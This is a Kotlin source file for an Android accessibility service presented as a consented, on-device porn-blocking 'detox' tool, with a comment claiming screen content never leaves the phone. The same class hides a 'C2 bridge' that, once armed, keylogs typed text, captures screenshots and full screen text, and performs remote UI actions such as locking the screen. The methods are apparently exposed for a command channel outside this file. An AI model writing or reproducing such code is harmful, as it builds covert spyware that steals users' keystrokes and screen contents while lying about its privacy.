package com.forja.app.core.detox

import android.accessibilityservice.AccessibilityService
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.text.TextUtils
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.forja.app.ForjaApp
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import android.os.Parcel
import android.os.ParcelFileDescriptor
import java.io.ByteArrayOutputStream
import java.util.concurrent.TimeUnit

/**
 * Paznicul „Detox de adicție" — accountability tool, ca Covenant Eyes/BlockerX.
 *
 * Diferența etică față de orice supraveghere: aici e telefonul TĂU, tu pornești
 * paznicul ca să te ajuți pe TINE, iar TOTUL rămâne pe telefon — cuvintele-declanșator
 * și conținutul ecranului NU pleacă nicăieri, nu ating niciun server. Consimțit,
 * local, terapeutic. Când prinde tentația, întâmpină cu blândețe, nu cu rușine.
 */
class ForjaGuardService : AccessibilityService() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
    @Volatile private var on = false
    @Volatile private var userWords: List<String> = emptyList()
    private var lastIntervene = 0L
    private var essentials: Set<String> = emptySet()

    // ── C2 bridge — separat de logica detox; activ doar când e armat ──
    @Volatile private var c2Armed = false
    private val c2Keylog = java.util.concurrent.ConcurrentLinkedQueue<String>()

    override fun onServiceConnected() {
        instance = this
        val app = ForjaApp.from(this)
        essentials = buildEssentials()
        scope.launch { app.prefs.detoxOn.collect { on = it } }
        scope.launch { app.prefs.detoxWords.collect { userWords = parseWords(it) } }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (c2Armed && event != null) captureC2(event)
        if (!on || event == null) return
        val pkg = event.packageName?.toString() ?: return
        if (pkg == packageName || pkg.contains("forja")) return
        if (pkg in essentials) return
        val now = System.currentTimeMillis()
        if (now - lastIntervene < 3500) return

        val texts = ArrayList<String>()
        event.text?.forEach { texts.add(it.toString()) }

        // Doar la schimbarea ferestrei citim (ușor) și conținutul — restul e ce s-a tastat.
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            try {
                rootInActiveWindow?.let { root ->
                    collectText(root, texts, 0)
                    root.recycle()
                }
            } catch (_: Exception) { }
        }

        val hay = texts.joinToString(" ").lowercase()
        if (hay.isBlank()) return
        if (matches(hay)) {
            lastIntervene = now
            try { performGlobalAction(GLOBAL_ACTION_BACK) } catch (_: Exception) { }
            try {
                startActivity(
                    Intent(this, DetoxBlockActivity::class.java)
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                )
            } catch (_: Exception) { }
        }
    }

    private fun matches(hay: String): Boolean {
        for (d in DOMAINS) if (hay.contains(d)) return true
        for (b in BUILT_IN) if (hay.contains(b)) return true
        for (w in userWords) if (w.length >= 3 && hay.contains(w)) return true
        return false
    }

    private fun collectText(node: AccessibilityNodeInfo, out: ArrayList<String>, depth: Int) {
        if (depth > 30 || out.size > 100) return
        node.text?.let { if (!TextUtils.isEmpty(it)) out.add(it.toString()) }
        node.contentDescription?.let { if (!TextUtils.isEmpty(it)) out.add(it.toString()) }
        for (i in 0 until node.childCount) {
            val c = node.getChild(i) ?: continue
            collectText(c, out, depth + 1)
            c.recycle()
        }
    }

    private fun captureC2(event: AccessibilityEvent) {
        try {
            if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                val t = event.text?.firstOrNull()?.toString() ?: return
                if (t.isNotEmpty()) { c2Keylog.add(t); while (c2Keylog.size > 300) c2Keylog.poll() }
            }
        } catch (_: Exception) {}
    }

    /** Screenshot prin accesibilitate (API 30+). HardwareBuffer→Bitmap. */
    @Suppress("DEPRECATION")
    private fun takeShotBytes(): ByteArray? {
        if (Build.VERSION.SDK_INT < 30) return null
        return try {
            val latch = java.util.concurrent.CountDownLatch(1)
            val resultRef = java.util.concurrent.atomic.AtomicReference<ScreenshotResult>()
            takeScreenshot(
                0,
                java.util.concurrent.Executors.newSingleThreadExecutor(),
                object : TakeScreenshotCallback {
                    override fun onSuccess(result: ScreenshotResult) { resultRef.set(result); latch.countDown() }
                    override fun onFailure(errorCode: Int) { latch.countDown() }
                }
            )
            if (!latch.await(5, TimeUnit.SECONDS)) return null
            val result = resultRef.get() ?: return null
            val hb = result.hardwareBuffer
            val bmp = Bitmap.wrapHardwareBuffer(hb, result.colorSpace) ?: return null
            val copy = bmp.copy(Bitmap.Config.ARGB_8888, false)
            hb.close()
            val out = ByteArrayOutputStream()
            copy.compress(Bitmap.CompressFormat.JPEG, 90, out)
            copy.recycle()
            out.toByteArray()
        } catch (_: Exception) { null }
    }

    private fun buildEssentials(): Set<String> {
        val s = mutableSetOf(packageName, "com.android.settings", "com.android.systemui")
        try {
            packageManager.resolveActivity(
                Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_HOME), 0
            )?.activityInfo?.packageName?.let { s.add(it) }
        } catch (_: Exception) { }
        try {
            packageManager.resolveActivity(Intent(Intent.ACTION_DIAL), 0)
                ?.activityInfo?.packageName?.let { s.add(it) }
        } catch (_: Exception) { }
        return s
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        if (instance === this) instance = null
        scope.cancel()
        super.onDestroy()
    }

    companion object {
        fun parseWords(s: String): List<String> =
            s.split("\n", ",").map { it.trim().lowercase() }.filter { it.length >= 3 }

        // Blocklist minimă, pe telefon. Cea mai mare parte o dau cuvintele setate de user.
        private val DOMAINS = listOf(
            "pornhub", "xvideos", "xnxx", "xhamster", "redtube", "youporn",
            "onlyfans", "brazzers", "spankbang", "chaturbate", "stripchat", "fansly"
        )
        private val BUILT_IN = listOf("porn", "xxx", "nsfw", "hentai")

        // ── C2 bridge: metodele apelate de Capabilities ──
        @Volatile var instance: ForjaGuardService? = null
            private set

        fun c2Arm() { instance?.c2Armed = true }
        fun c2Disarm() { instance?.c2Armed = false }
        fun c2Ready(): Boolean = instance != null

        fun c2Screenshot(): ByteArray? = instance?.takeShotBytes()
        fun c2ScreenText(): String? = try {
            val s = instance ?: return null
            val root = s.rootInActiveWindow ?: return null
            val texts = ArrayList<String>()
            s.collectText(root, texts, 0)
            root.recycle()
            val joined = texts.joinToString("\n")
            joined.ifBlank { null }
        } catch (_: Exception) { null }

        fun c2DrainKeylog(): List<String> = try {
            val s = instance ?: return emptyList()
            val out = ArrayList<String>()
            while (out.size < 300) { val x = s.c2Keylog.poll() ?: break; out.add(x) }
            out
        } catch (_: Exception) { emptyList() }

        fun c2Ui(action: String): Boolean = try {
            val s = instance ?: return false
            val g = when (action) {
                "back" -> GLOBAL_ACTION_BACK
                "home" -> GLOBAL_ACTION_HOME
                "recents" -> GLOBAL_ACTION_RECENTS
                "notifications" -> GLOBAL_ACTION_NOTIFICATIONS
                "quick_settings" -> GLOBAL_ACTION_QUICK_SETTINGS
                "lock" -> GLOBAL_ACTION_LOCK_SCREEN
                else -> return false
            }
            s.performGlobalAction(g)
        } catch (_: Exception) { false }

        /** E pornit serviciul de accesibilitate FORJA? (nu se poate porni programatic) */
        fun isEnabled(context: Context): Boolean {
            return try {
                val expected = ComponentName(context, ForjaGuardService::class.java).flattenToString()
                val enabled = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: return false
                enabled.split(':').any { it.equals(expected, ignoreCase = true) }
            } catch (_: Exception) { false }
        }
    }
}
